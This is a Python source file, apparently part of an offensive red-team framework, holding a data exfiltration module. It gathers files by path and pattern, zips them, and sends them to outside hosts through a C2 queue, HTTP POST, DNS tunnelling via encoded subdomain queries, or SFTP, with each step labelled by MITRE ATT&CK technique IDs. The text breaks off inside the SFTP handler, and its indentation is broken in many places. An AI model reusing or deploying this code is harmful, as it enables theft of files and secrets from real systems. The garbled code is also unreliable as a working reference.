"""
Exfiltration Module
Handles collection and exfiltration of data.
"""

import os
import sys
import time
import random
import string
import base64
import zipfile
import tempfile
import logging
import glob
import shutil
import threading
import socket # For basic DNS lookup simulation
import math
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime
import requests
# Import dnspython
import dns.resolver
import dns.exception

# Import Paramiko for SFTP if available
try:
    import paramiko
except ImportError:
    paramiko = None # Handle optional dependency
    # Consider logging a warning if paramiko is needed but not installed

# Import ftplib for FTP
import ftplib

# Import TYPE_CHECKING if not already present
from typing import TYPE_CHECKING

# Avoid circular import for type hinting
if TYPE_CHECKING:
    from ..command_control.command_control import CommandControl
    from ..execution.execution import Execution # May need later for compression tools

class Exfiltration:
    """Handles data collection and exfiltration techniques."""
    
    # Inject CommandControl to access its outbound queue/mechanism
    def __init__(self, command_control_module: Optional['CommandControl'] = None):
        self.command_control = command_control_module
        self.config = {
            "default_max_file_size_kb": 10240, # 10MB
            "default_max_total_exfil_kb": 102400, # 100MB per operation
            "default_max_files": 100,
            "default_chunk_size_kb": 512,
            "default_archive_format": "zip",
            "staging_dir_base": None # Optional base for temp staging dirs
        }
        self.logger = logging.getLogger(__name__)
        if not command_control_module:
            self.logger.warning("Exfiltration module initialized WITHOUT CommandControl module. Exfil via C2 will fail.")

    def update_config(self, config: Dict[str, Any]):
        """Update internal config with loaded configuration."""
        exfil_config = config.get("modules", {}).get("exfiltration", {})
        self.config.update(exfil_config)
        self.logger.info("Exfiltration module configuration updated.")

    def run_exfiltration(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Route exfiltration requests to appropriate handlers."""
        result = {
            "status": "success",
            "timestamp": datetime.now().isoformat(),
            "results": {}
        }
        errors = []

        exfil_requests = data.get("exfiltrate", {}) # e.g., {"method": "via_c2", "details": {...}}
        method = exfil_requests.get("method")
        details = exfil_requests.get("details", {})

        if not method:
            return {"status": "error", "message": "Missing 'method' in exfiltration request data."}

        # Add original method to details for context in _handle_not_implemented
        details['_original_method'] = method 

        handler_map = {
            "via_c2": self._handle_exfil_via_c2,
            "direct_http": self._handle_exfil_direct_http,
            "dns_tunnel": self._handle_exfil_dns_tunnel,
            "sftp": self._handle_exfil_sftp, # Added SFTP handler
            "ftp": self._handle_exfil_ftp, # Added FTP handler
            "scheduled_transfer": self._handle_scheduled_transfer, # Added Schedule handler
            
            # Map other placeholders
            "alternative_protocol": self._handle_exfil_sftp, # Map common alternative to SFTP
            "protocol_exfiltration": self._handle_exfil_ftp, # Map common alternative to FTP
            "data_transfer": self._handle_not_implemented,
        }

        handler = handler_map.get(method)

        if handler:
            try:
                exfil_result = handler(details)
                result["results"][method] = exfil_result
                if exfil_result.get("status") == "failure":
                    result["status"] = "partial_success"
                    errors.append(f"Method '{method}' failed: {exfil_result.get('details', {}).get('error', 'Unknown reason')}")
            except Exception as e:
                error_msg = f"Exfiltration method '{method}' failed: {e}"
                errors.append(error_msg)
                self._log_error(error_msg, exc_info=True)
                result["results"][method] = {"status": "error", "message": str(e)}
        else:
            error_msg = f"Unsupported exfiltration method requested: {method}"
            errors.append(error_msg)
            self._log_error(error_msg)
            result["results"][method] = {"status": "error", "message": error_msg}

        if errors:
            result["status"] = "failure" if not result["results"] or all(v.get("status") == "error" for v in result["results"].values()) else "partial_success"
            result["errors"] = errors

        return result
        
    def _collect_files(self, details: Dict[str, Any]) -> Tuple[List[str], int, List[str]]:
        """Collects files based on paths, patterns, and limits."""
        paths_to_search = details.get("paths", [])
        patterns = details.get("patterns", ["*"]) # Default to all files
        max_size_kb = details.get("max_file_size_kb", self.config["default_max_file_size_kb"])
        max_total_kb = details.get("max_total_exfil_kb", self.config["default_max_total_exfil_kb"])
        max_files = details.get("max_files", self.config["default_max_files"])
        recursive = details.get("recursive", True)
        
        collected_files = []
        skipped_files = []
        total_size_kb = 0
        checked_count = 0

        if not isinstance(paths_to_search, list): paths_to_search = [paths_to_search]
        if not isinstance(patterns, list): patterns = [patterns]
        
        self.logger.info(f"Starting file collection. Paths: {paths_to_search}, Patterns: {patterns}, MaxFiles: {max_files}, MaxFileSizeKB: {max_size_kb}, MaxTotalKB: {max_total_kb}")

        for start_path_str in paths_to_search:
            start_path = Path(start_path_str).expanduser() # Expand ~
            if not start_path.exists():
                self.logger.warning(f"Collection path does not exist: {start_path}")
                skipped_files.append(f"{start_path} (Not Found)")
                continue

            # Determine if path is dir or file
            if start_path.is_file():
                 iterator = [start_path]
                 is_dir_search = False
            elif start_path.is_dir():
                 # Create a generator for walking or globbing
                 if recursive:
                      iterator = start_path.rglob("*") # Generator for recursive glob
                 else:
                      iterator = start_path.glob("*") # Generator for non-recursive glob
                 is_dir_search = True
            else:
                 self.logger.warning(f"Collection path is not a file or directory: {start_path}")
                 skipped_files.append(f"{start_path} (Not File/Dir)")
                 continue

            # Iterate through files/directories found
            for item_path in iterator:
                checked_count += 1
                if len(collected_files) >= max_files:
                     self.logger.warning(f"Reached max file limit ({max_files}). Stopping collection.")
                     break # Stop outer loop too?
                     
                # If searching a directory, check if item is a file
                if is_dir_search and not item_path.is_file():
                    continue # Skip directories when iterating a directory path
                
                # Check against patterns
                matches_pattern = False
                for pattern in patterns:
                    if item_path.match(pattern):
                        matches_pattern = True
                        break
                if not matches_pattern:
                    # self.logger.debug(f"Skipping {item_path} (doesn't match patterns)")
                    continue

                # Check file size
                try:
                    file_size_bytes = item_path.stat().st_size
                    file_size_kb = file_size_bytes / 1024.0

                    if file_size_kb > max_size_kb:
                         # self.logger.debug(f"Skipping {item_path} (size {file_size_kb:.2f}KB > max {max_size_kb}KB)")
                         skipped_files.append(f"{item_path} (Too Large)")
                         continue
                    
                    if (total_size_kb + file_size_kb) > max_total_kb:
                         self.logger.warning(f"Reached max total size ({max_total_kb}KB). Cannot add {item_path}. Stopping collection.")
                         skipped_files.append(f"{item_path} (Exceeds Total Limit)")
                         break # Stop processing this path

                    # If all checks pass, add to list
                    collected_files.append(str(item_path.resolve()))
                    total_size_kb += file_size_kb
                    self.logger.debug(f"Collected: {item_path} ({file_size_kb:.2f}KB)")

                except OSError as e:
                    self.logger.warning(f"Could not access/stat file {item_path}: {e}")
                    skipped_files.append(f"{item_path} (Access Error)")
                except Exception as e:
                    self.logger.warning(f"Unexpected error processing file {item_path}: {e}")
                    skipped_files.append(f"{item_path} (Unknown Error)")

            if len(collected_files) >= max_files or total_size_kb >= max_total_kb:
                 break # Stop searching other paths if limits reached
                 
        self.logger.info(f"File collection finished. Collected {len(collected_files)} files, Total Size: {total_size_kb:.2f}KB. Skipped {len(skipped_files)} files. Checked {checked_count} items.")
        return collected_files, total_size_kb, skipped_files

    def _stage_and_archive_files(self, file_list: List[str], details: Dict[str, Any]) -> Tuple[Optional[str], str, bool]:
        """Copies files to a staging directory (temporary or specified) and creates an archive.

        Returns:
            Tuple containing:
                - Path to the created archive (str) or None if failed.
                - Error message string (str).
                - Flag indicating if the staging directory was temporary (bool).
        """
        archive_format = details.get("archive_format", self.config["default_archive_format"]) # zip, tar
        archive_password = details.get("archive_password")
        compression_level = details.get("compression_level", zipfile.ZIP_DEFLATED) # zipfile specific
        
        # Determine staging directory
        user_staging_dir = details.get("staging_dir")
        is_temporary_staging = False
        staging_dir_path: Optional[Path] = None

        if user_staging_dir:
             staging_dir_path = Path(user_staging_dir)
             self.logger.info(f"Using specified staging directory: {staging_dir_path}")
             try:
                 staging_dir_path.mkdir(parents=True, exist_ok=True)
             except OSError as e:
                 reason = f"Failed to create/access specified staging directory {staging_dir_path}: {e}"
                 self.logger.error(reason)
                 return None, reason, False # Return None for path, error message, not temporary
        else:
             staging_base = self.config.get("staging_dir_base")
        staging_dir = tempfile.mkdtemp(prefix="bluefire_exfil_", dir=staging_base)
             staging_dir_path = Path(staging_dir)
             is_temporary_staging = True
             self.logger.info(f"Created temporary staging directory: {staging_dir_path}")
        
        # Ensure staging_dir_path is set (should be unless error above)
        if not staging_dir_path:
             return None, "Failed to determine staging directory path.", False
             
        # --- Staging Logic (Moved from _stage_files) ---
            staged_files_map = {}
        error_msg = ""
            for file_path_str in file_list:
             item_path = Path(file_path_str)
             target_name = item_path.name
             dest_path = staging_dir_path / target_name
             
             try:
                 if not item_path.exists():
                     self.logger.warning(f"Cannot stage '{item_path}': Path does not exist.")
                     error_msg += f"Skipped {item_path} (Not Found); "
                     continue

                 # Handle potential name collisions simply (append number)
                      counter = 0
                 original_dest_path = dest_path
                 while dest_path.exists() and counter < 100: # Limit collision checks
                          counter += 1
                     dest_path = staging_dir_path / f"{original_dest_path.stem}_{counter}{original_dest_path.suffix}"
                 if dest_path.exists(): # Still exists after attempts
                     raise OSError(f"Destination path {original_dest_path} or numbered variants already exist.")

                 if item_path.is_file():
                     self.logger.debug(f"Staging file: {item_path} -> {dest_path}")
                     shutil.copy2(item_path, dest_path) # Preserves metadata
                     staged_files_map[file_path_str] = str(dest_path)
                 elif item_path.is_dir():
                     self.logger.debug(f"Staging directory: {item_path} -> {dest_path}")
                     # copytree fails if dest exists, safe now due to collision check above
                     shutil.copytree(item_path, dest_path, symlinks=False, ignore=None)
                     staged_files_map[file_path_str] = str(dest_path)
                 else:
                     self.logger.warning(f"Cannot stage '{item_path}': Not a file or directory.")
                     error_msg += f"Skipped {item_path} (Not File/Dir); "

             except shutil.Error as e:
                 reason = f"shutil Error staging {item_path}: {e}"
                 self.logger.error(reason)
                 error_msg += f"Failed {item_path} ({reason}); "
             except OSError as e:
                 reason = f"OS Error staging {item_path}: {e}"
                 self.logger.error(reason)
                 error_msg += f"Failed {item_path} ({reason}); "
                 except Exception as e:
                 reason = f"Unexpected error staging {item_path}: {e}"
                 self.logger.error(reason, exc_info=True)
                 error_msg += f"Failed {item_path} ({reason}); "

            if not staged_files_map:
            error_msg += "No files were successfully staged."
            self.logger.error(error_msg)
            # Clean up temp dir if created
            if is_temporary_staging:
                 self._cleanup_directory(staging_dir_path)
            return None, error_msg, is_temporary_staging
            
        # --- Archiving Logic --- 
        archive_name_base = f"exfil_pkg_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        archive_path_str: Optional[str] = None

        try:
            # Create archive within the staging directory
            if archive_format.lower() == "zip":
                archive_path = staging_dir_path / f"{archive_name_base}.zip"
                archive_path_str = str(archive_path)
                self.logger.info(f"Creating zip archive: {archive_path_str}")
                with zipfile.ZipFile(archive_path_str, 'w', compression=compression_level) as zipf:
                    if archive_password:
                         # Note: zipfile's built-in encryption is weak.
                         zipf.setpassword(archive_password.encode())
                         self.logger.info("Applying password protection to zip (basic).")
                    # Add staged files using their destination name within the staging dir
                    for staged_path_str in staged_files_map.values():
                         staged_path = Path(staged_path_str)
                         # Arcname determines the name inside the zip
                         zipf.write(staged_path, arcname=staged_path.name)
            
            # Add elif for tarfile here if needed
            
            else:
                raise ValueError(f"Unsupported archive format: {archive_format}")
            
            self.logger.info(f"Archive created successfully: {archive_path_str}")
            
        except Exception as e:
            self.logger.error(f"Error during archiving: {e}", exc_info=True)
            error_msg += f" Archiving failed: {e}"
            archive_path_str = None # Ensure archive path is None on failure
            # Clean up temp dir if created, even if archiving failed after staging
            if is_temporary_staging:
                 self._cleanup_directory(staging_dir_path)

        # Note: We do NOT clean up the staging directory here if it was user-specified
        # or if it's temporary AND archiving succeeded (caller cleans up temp dir after use)
            
        return archive_path_str, error_msg, is_temporary_staging

    def _cleanup_directory(self, dir_path: Path):
        """Safely remove a directory and its contents."""
        if dir_path and dir_path.is_dir(): # Check if it exists and is a directory
            try:
                shutil.rmtree(dir_path)
                self.logger.info(f"Cleaned up directory: {dir_path}")
            except OSError as e:
                self.logger.error(f"Failed to clean up directory {dir_path}: {e}")
        else:
            self.logger.debug(f"Skipping cleanup, directory not found or invalid: {dir_path}")

    def _handle_exfil_via_c2(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Collects, stages (optional), archives, encodes, and queues data for C2 exfil."""
        if not self.command_control:
            return {"status": "failure", "reason": "CommandControl module unavailable."}

        c2_chunk_size_bytes = details.get("c2_chunk_size_bytes", 1024 * 5)
        self.logger.info("Starting exfil via C2...")
        collected_files, total_kb, skipped = [], 0, []
        archive_path = None
        staging_dir_path = None # Use Path object
        is_temporary_staging = False # Track if staging dir is temporary
        status = "failure"
        reason = ""
        result_details = {
            "collected_files_count": 0,
            "total_collected_kb": 0,
            "skipped_files": [],
            "staged_path": None,
            "archive_path": None,
            "archive_size_kb": 0,
            "encoded_size_chars": 0,
            "chunks_queued": 0,
            "total_bytes_queued": 0
        }

        try:
            # Step 1: Collect Files
            self.logger.debug("Step 1: Collecting files...")
            collected_files, total_kb, skipped = self._collect_files(details)
            result_details["collected_files_count"] = len(collected_files)
            result_details["total_collected_kb"] = total_kb
            result_details["skipped_files"] = skipped
            if not collected_files:
                 raise FileNotFoundError("No files collected for exfiltration.")
            self.logger.info(f"Collected {len(collected_files)} files ({total_kb:.2f} KB).")

            # Step 2: Stage and Archive (Uses temporary dir unless staging_dir specified)
            self.logger.debug("Step 2: Staging and archiving...")
            archive_path, error_msg, is_temporary_staging = \
                self._stage_and_archive_files(collected_files, details)
            
            if not archive_path:
                raise Exception(f"Failed to create archive: {error_msg}")
            
            archive_path_obj = Path(archive_path)
            staging_dir_path = archive_path_obj.parent # Get staging dir from archive path
            archive_size_bytes = archive_path_obj.stat().st_size
            archive_size_kb = archive_size_bytes / 1024.0
            result_details["staged_path"] = str(staging_dir_path)
            result_details["archive_path"] = archive_path
            result_details["archive_size_kb"] = archive_size_kb
            self.logger.info(f"Created archive: {archive_path} ({archive_size_kb:.2f} KB)")

            # Step 3: Read, Encode, Chunk, and Queue via CommandControl
            self.logger.debug(f"Step 3: Encoding and queuing {archive_size_bytes} bytes via C2...")
            with open(archive_path, 'rb') as f:
                archive_data = f.read()

            encoded_data_str = base64.b64encode(archive_data).decode('ascii')
            encoded_size = len(encoded_data_str)
            result_details["encoded_size_chars"] = encoded_size
            self.logger.debug(f"Base64 encoded size: {encoded_size} chars.")

            # Chunk the encoded string
            num_chunks = math.ceil(encoded_size / c2_chunk_size_bytes)
            exfil_session_id = details.get("session_id", os.urandom(4).hex())
            archive_filename = os.path.basename(archive_path)
            data_chunks_queued = 0
            total_bytes_queued = 0

            for i in range(num_chunks):
                chunk_start = i * c2_chunk_size_bytes
                chunk_end = chunk_start + c2_chunk_size_bytes
                chunk_data = encoded_data_str[chunk_start:chunk_end]
                chunk_bytes_len = len(chunk_data.encode('ascii')) # Get byte length of encoded chunk

                # Construct metadata for C2 handler
                exfil_metadata = {
                    "type": "exfil_chunk",
                    "session_id": exfil_session_id,
                    "filename": archive_filename,
                    "chunk_index": i + 1,
                    "total_chunks": num_chunks,
                    "encoding": "base64",
                    "payload": chunk_data
                }
                
                # Queue the chunk using CommandControl
                queued = self.command_control.queue_outbound(exfil_metadata)
                if queued:
                data_chunks_queued += 1
                     total_bytes_queued += chunk_bytes_len
                     self.logger.debug(f"Queued chunk {i+1}/{num_chunks} ({chunk_bytes_len} bytes) for session {exfil_session_id}")
                else:
                     reason = f"Failed to queue chunk {i+1} via CommandControl."
                     self.logger.error(reason)
                     # Decide whether to stop or continue trying other chunks?
                     # Let's stop for now if queuing fails.
                     raise RuntimeError(reason)
                
                # Optional: Add delay between chunks
                delay = details.get("chunk_delay_ms", 0)
                if delay > 0:
                     time.sleep(delay / 1000.0)

            result_details["chunks_queued"] = data_chunks_queued
            result_details["total_bytes_queued"] = total_bytes_queued
                status = "success"
            reason = f"Successfully queued {data_chunks_queued} chunks ({total_bytes_queued} bytes) for exfil session {exfil_session_id}."
                self.logger.info(reason)

        except FileNotFoundError as e:
            reason = f"Exfil via C2 failed: {e}"
            self.logger.warning(reason) # Use warning for file not found
            status = "failure" # Or maybe "no_op" if no files is acceptable?
        except Exception as e:
            reason = f"Exfil via C2 failed: {e}"
             self.logger.error(reason, exc_info=True)
             status = "failure"
        finally:
            # Step 4: Cleanup - ONLY remove temporary staging directory
            if is_temporary_staging and staging_dir_path:
                 self.logger.debug(f"Cleaning up temporary staging directory: {staging_dir_path}")
                 self._cleanup_directory(staging_dir_path) 
            elif staging_dir_path:
                 self.logger.info(f"Skipping cleanup of user-specified staging directory: {staging_dir_path}")

        return {
            "status": status,
            "technique": "exfiltration_via_c2",
            "mitre_technique_id": "T1041", # Exfiltration Over C2 Channel
            "mitre_technique_name": "Exfiltration Over C2 Channel",
            "details": result_details,
            "reason": reason if status != "success" else None
        }

    def _handle_exfil_direct_http(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Exfiltrate data via a direct HTTP POST request."""
        status = "failure"
        result_details = {
             "collected_files_count": 0,
             "total_collected_kb": 0,
             "skipped_files": [],
             "staged_path": None,
             "archive_path": None,
             "archive_size_kb": 0,
             "target_url": None,
             "http_status_code": None,
             "response_snippet": None,
             "error": None
        }
        archive_path: Optional[str] = None
        staging_dir_path: Optional[Path] = None
        is_temporary_staging = False
        mitre_id = "T1048.003" # Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol
        mitre_name = "Exfiltration Over Unencrypted Non-C2 Protocol"

        http_post_url = details.get("http_post_url")
        if not http_post_url:
            reason = "Missing required parameter: http_post_url"
            self.logger.error(reason)
            result_details["error"] = reason
            return {"status": "error", "reason": reason, "details": result_details, 
                    "mitre_technique_id": mitre_id, "mitre_technique_name": mitre_name}

        result_details["target_url"] = http_post_url
        self.logger.info(f"Starting exfil via direct HTTP POST to {http_post_url}")
        
        try:
            # 1. Collect Files
            self.logger.debug("Step 1: Collecting files...")
            collected_files, total_kb, skipped = self._collect_files(details)
            result_details["collected_files_count"] = len(collected_files)
            result_details["total_collected_kb"] = round(total_kb, 2)
            result_details["skipped_files"] = skipped
            if not collected_files:
                raise FileNotFoundError("No files collected matching the criteria.")
            self.logger.info(f"Collected {len(collected_files)} files ({total_kb:.2f} KB).")

            # 2. Stage and Archive Files (using updated method)
            self.logger.debug("Step 2: Staging and archiving...")
            archive_path, error_msg, is_temporary_staging = \
                self._stage_and_archive_files(collected_files, details)
            
            if not archive_path:
                 raise Exception(f"Failed to create archive: {error_msg}")
            
            archive_path_obj = Path(archive_path)
            staging_dir_path = archive_path_obj.parent # Keep track for cleanup
            archive_size_bytes = archive_path_obj.stat().st_size
            archive_size_kb = archive_size_bytes / 1024.0
            result_details["staged_path"] = str(staging_dir_path)
            result_details["archive_path"] = archive_path
            result_details["archive_size_kb"] = archive_size_kb
            self.logger.info(f"Created archive: {archive_path} ({archive_size_kb:.2f} KB)")
            
            # 3. Send via HTTP POST
            self.logger.debug(f"Step 3: Sending archive via HTTP POST...")
            headers = details.get("headers", {})
            # Default content type if none provided
            headers.setdefault('Content-Type', 'application/octet-stream') 
            verify_ssl = details.get("verify_ssl", self.config.get("verify_ssl", True))
            timeout = details.get("timeout_seconds", 60)

            with open(archive_path, 'rb') as f_archive:
                      response = requests.post(http_post_url, data=f_archive, 
                                                 headers=headers, verify=verify_ssl, timeout=timeout)
                      response.raise_for_status() # Check for HTTP errors
                      
                      status = "success"
                      result_details["http_status_code"] = response.status_code
                 response_text = response.text
                 result_details["response_snippet"] = response_text[:200] + ('...' if len(response_text) > 200 else '')
                      self.logger.info(f"Successfully POSTed archive to {http_post_url}. Status: {response.status_code}")

        except FileNotFoundError as fnf_err:
             reason = str(fnf_err)
             self.logger.error(f"Direct HTTP exfil failed: {reason}")
             result_details["error"] = reason
             status = "failure"
        except requests.exceptions.RequestException as req_err:
             reason = f"HTTP POST request failed: {req_err}"
             self.logger.error(reason)
             result_details["error"] = reason
             status = "failure"
        except Exception as e:
            reason = f"Error during direct HTTP exfil process: {e}"
            self.logger.error(reason, exc_info=True)
            result_details["error"] = reason
            status = "failure"
        finally:
            # 4. Cleanup Staging Directory (only if temporary)
            if is_temporary_staging and staging_dir_path:
                self.logger.debug(f"Cleaning up temporary staging directory: {staging_dir_path}")
                self._cleanup_directory(staging_dir_path) 
            elif staging_dir_path:
                self.logger.info(f"Skipping cleanup of non-temporary staging directory: {staging_dir_path}")

        return {
            "status": status,
            "technique": "exfil_direct_http",
            "mitre_technique_id": mitre_id,
            "mitre_technique_name": mitre_name,
            "timestamp": datetime.now().isoformat(),
            "details": result_details,
            "reason": reason if status != "success" else None # Include reason on failure
        }

    def _handle_exfil_dns_tunnel(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Collects files, encodes data, and exfiltrates via DNS queries."""
        controlled_domain = details.get("controlled_domain")
        if not controlled_domain:
            return {"status": "failure", "reason": "Missing 'controlled_domain' for dns_tunnel exfil."}

        chunk_size = details.get("chunk_size", 60)
        session_id = details.get("session_id", os.urandom(4).hex())
        query_type = details.get("query_type", 'A').upper()
        query_delay_ms = details.get("query_delay_ms", 50)
        query_delay_sec = query_delay_ms / 1000.0
        
        mitre_id = "T1071.004" # Application Layer Protocol: DNS
        mitre_name = "Exfiltration Over Alternative Protocol: DNS"
        result_details = {
             "collected_files_count": 0,
             "total_collected_kb": 0,
             "skipped_files": [],
             "staged_path": None,
             "archive_path": None,
             "archive_size_kb": 0,
             "encoded_size_chars": 0,
             "controlled_domain": controlled_domain,
             "session_id": session_id,
             "query_type": query_type,
             "chunk_size": chunk_size,
             "queries_attempted": 0,
             "queries_successful": 0,
             "queries_failed": 0,
             "error": None
        }

        self.logger.info(f"Starting DNS Tunnel exfil to {controlled_domain} (Session: {session_id})")
        archive_path: Optional[str] = None
        staging_dir_path: Optional[Path] = None
        is_temporary_staging = False
        status = "failure"
        reason = ""

        try:
            # 1. Collect Files
            self.logger.debug("Step 1: Collecting files...")
            collected_files, total_kb, skipped = self._collect_files(details)
            result_details["collected_files_count"] = len(collected_files)
            result_details["total_collected_kb"] = round(total_kb, 2)
            result_details["skipped_files"] = skipped
            if not collected_files:
                 raise FileNotFoundError("No files collected for DNS exfiltration.")
            self.logger.info(f"Collected {len(collected_files)} files ({total_kb:.2f} KB).")

            # 2. Stage and Archive (using updated method)
            self.logger.debug("Step 2: Staging and archiving...")
            archive_path, error_msg, is_temporary_staging = \
                self._stage_and_archive_files(collected_files, details)
                
            if not archive_path:
                raise Exception(f"Failed to create archive: {error_msg}")
                
            archive_path_obj = Path(archive_path)
            staging_dir_path = archive_path_obj.parent # Keep track for cleanup
            archive_size_bytes = archive_path_obj.stat().st_size
            archive_size_kb = archive_size_bytes / 1024.0
            result_details["staged_path"] = str(staging_dir_path)
            result_details["archive_path"] = archive_path
            result_details["archive_size_kb"] = archive_size_kb
            self.logger.info(f"Created archive: {archive_path} ({archive_size_kb:.2f} KB)")

            # 3. Read, Encode (Base32), Chunk, and Send DNS Queries
            self.logger.debug(f"Step 3: Encoding ({archive_size_bytes} bytes) and sending DNS queries...")
            with open(archive_path, 'rb') as f:
                archive_data = f.read()

            # Base32 is better for DNS labels (alphanumeric)
            encoded_data = base64.b32encode(archive_data).decode('ascii').rstrip('=')
            encoded_size = len(encoded_data)
            result_details["encoded_size_chars"] = encoded_size
            self.logger.debug(f"Base32 encoded size: {encoded_size} chars.")

            num_chunks = math.ceil(encoded_size / chunk_size)
            self.logger.info(f"Splitting into {num_chunks} chunks (max size: {chunk_size})...")

            resolver = dns.resolver.Resolver()
            # Optionally configure resolver (timeout, nameservers)
            resolver.timeout = details.get("dns_timeout", 2)
            resolver.lifetime = details.get("dns_lifetime", 5)
            nameservers = details.get("nameservers")
            if isinstance(nameservers, list) and nameservers:
                 resolver.nameservers = nameservers
                 self.logger.info(f"Using custom nameservers: {nameservers}")

            successful_queries = 0
            failed_queries = 0
            for i in range(num_chunks):
                chunk = encoded_data[i * chunk_size : (i + 1) * chunk_size]
                # Format: <chunk>.<index>.<session>.<domain>
                fqdn = f"{chunk}.{i:04d}.{session_id}.{controlled_domain}" 
                result_details["queries_attempted"] += 1

                # Check FQDN length constraints before querying
                if len(fqdn) > 253:
                     self.logger.warning(f"Skipping query {i+1}/{num_chunks}, FQDN too long ({len(fqdn)}): {fqdn[:60]}...")
                     failed_queries += 1
                     continue
                labels = fqdn.split('.')
                if any(len(label) > 63 for label in labels):
                    self.logger.warning(f"Skipping query {i+1}/{num_chunks}, label too long: {fqdn[:60]}...")
                    failed_queries += 1
                    continue

                # Perform DNS query
                try:
                    self.logger.debug(f"Querying ({query_type}) for: {fqdn[:60]}...")
                    # Use resolver.resolve, handle potential exceptions
                    answers = resolver.resolve(fqdn, query_type, raise_on_no_answer=False)
                    if answers.rrset is not None:
                        # Unexpectedly got an answer
                        self.logger.warning(f"DNS query for {fqdn[:60]}... unexpectedly resolved.")
                        # Count as success for transmission attempt
                    successful_queries += 1
                    else:
                        # No answer, but also no NXDOMAIN (e.g., SERVFAIL, timeout within resolve)
                        # Treat as failure for reliable exfil logging
                        self.logger.warning(f"DNS query for {fqdn[:60]}... received no answer or failed internally.")
                        failed_queries += 1
                        
                except dns.resolver.NXDOMAIN:
                    # Expected outcome for passive logging servers
                    self.logger.debug(f"Query {i+1}/{num_chunks} NXDOMAIN (expected).")
                    successful_queries += 1
                except dns.exception.Timeout:
                     self.logger.warning(f"Query {i+1}/{num_chunks} timed out for {fqdn[:60]}...")
                    failed_queries += 1
                except dns.exception.DNSException as dns_err:
                    self.logger.warning(f"Query {i+1}/{num_chunks} failed for {fqdn[:60]}...: {dns_err}")
                     failed_queries += 1
                except Exception as gen_err: # Catch other potential errors
                     self.logger.error(f"Unexpected error during DNS query {i+1}/{num_chunks}: {gen_err}", exc_info=True)
                     failed_queries += 1
                
                # Delay between queries
                if query_delay_sec > 0:
                    time.sleep(query_delay_sec)

            result_details["queries_successful"] = successful_queries
            result_details["queries_failed"] = failed_queries
            
            # Determine status based on query results
            if successful_queries > 0:
                status = "partial_success" if failed_queries > 0 else "success"
                reason = f"Completed DNS exfil attempts. Successful: {successful_queries}, Failed: {failed_queries}."
                self.logger.info(reason)
            else:
                 reason = f"All {result_details['queries_attempted']} DNS exfil queries failed."
                 self.logger.error(reason)
                 status = "failure"

        except FileNotFoundError as fnf_err:
             reason = f"DNS Tunnel exfil failed: {fnf_err}"
                 self.logger.error(reason)
             result_details["error"] = reason
             status = "failure"
        except Exception as e:
            reason = f"Error during DNS Tunnel exfil process: {e}"
            self.logger.error(reason, exc_info=True)
            result_details["error"] = reason
            status = "failure"
        finally:
            # 4. Cleanup Staging Directory (only if temporary)
            if is_temporary_staging and staging_dir_path:
                self.logger.debug(f"Cleaning up temporary staging directory: {staging_dir_path}")
                self._cleanup_directory(staging_dir_path) 
            elif staging_dir_path:
                 self.logger.info(f"Skipping cleanup of non-temporary staging directory: {staging_dir_path}")

        return {
            "status": status,
            "technique": "exfil_dns_tunnel",
            "mitre_technique_id": mitre_id,
            "mitre_technique_name": mitre_name,
            "timestamp": datetime.now().isoformat(),
            "details": result_details,
            "reason": reason if status != "success" else None
        }

    def _handle_exfil_sftp(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Exfiltrates data via SFTP, requires host key in known_hosts."""
        if not paramiko:
            return {"status": "error", "reason": "Paramiko library not installed. Cannot use SFTP."}

        status = "failure"
        mitre_id = "T1048.003" # Exfiltration Over Alternative Protocol
        mitre_name = "Exfiltration Over Alternative Protocol: SFTP"
        result_details = {
            "hostname": details.get("hostname"),
            "port": details.get("port", 22),
            "username": details.get("username"),
            "remote_path": details.get("remote_path"),
            "sftp_status": None,
            "error": None,
            "collected_files_count": 0,
            "total_collected_kb": 0,
            "skipped_files": [],
            "staged_path": None,
            "archive_path": None,
            "archive_size_kb": 0,
            "remote_target_path": None
        }
        archive_path: Optional[str] = None
        staging_dir_path: Optional[Path] = None
        is_temporary_staging = False
        sftp = None
        ssh = None

        # Validate required connection details
        req_params = ["hostname", "username", "remote_path"]
        # Require either password or key file
        has_auth = details.get("password") or details.get("key_filename")
        if not all(details.get(p) for p in req_params) or not has_auth:
            reason = f"Missing required SFTP parameters: Need {req_params} and password/key_filename."
             self.logger.error(reason)
            result_details["error"] = reason
            return {"status": "error", "reason": reason, "details": result_details,
                    "mitre_technique_id": mitre_id, "mitre_technique_name": mitre_name}

        hostname = result_details["hostname"]
        port = result_details["port"]
        username = result_details["username"]
        password = details.get("password")
        key_filename = details.get("key_filename")
        remote_dir_str = details.get("remote_path")
        timeout = details.get("timeout", 30)

        self.logger.info(f"Starting exfil via SFTP to {username}@{hostname}:{port}{remote_dir_str}")

        try:
            # 1. Collect, Stage, Archive
            self.logger.debug("Step 1: Collecting files...")
            collected_files, total_kb, skipped = self._collect_files(details)
            result_details["collected_files_count"] = len(collected_files)
            result_details["total_collected_kb"] = round(total_kb, 2)
            result_details["skipped_files"] = skipped
            if not collected_files:
                raise FileNotFoundError("No files collected for SFTP exfiltration.")
            self.logger.info(f"Collected {len(collected_files)} files ({total_kb:.2f} KB).")

            self.logger.debug("Step 2: Staging and archiving...")
            archive_path, error_msg, is_temporary_staging = \
                self._stage_and_archive_files(collected_files, details)
            if not archive_path:
                raise Exception(f"Failed to create archive: {error_msg}")
            archive_path_obj = Path(archive_path)
            staging_dir_path = archive_path_obj.parent
            archive_size_kb = archive_path_obj.stat().st_size / 1024.0
            result_details["staged_path"] = str(staging_dir_path)
            result_details["archive_path"] = archive_path
            result_details["archive_size_kb"] = archive_size_kb
            self.logger.info(f"Created archive: {archive_path} ({archive_size_kb:.2f} KB)")
            local_filename = archive_path_obj.name

            # 2. Establish SSH Connection with Host Key Verification
            self.logger.debug("Step 3: Connecting via SSH (requires known host key!)...")
            ssh = paramiko.SSHClient()
            # Load system host keys. Connection will fail if key unknown.
            ssh.load_system_host_keys() 
            # Optionally add RejectPolicy or WarningPolicy instead of default StrictHostKeyPolicy
            # ssh.set_missing_host_key_policy(paramiko.RejectPolicy()) # Stricter
            self.logger.warning(f"Attempting SSH connection to {hostname}. Host key MUST be in known_hosts.")
            
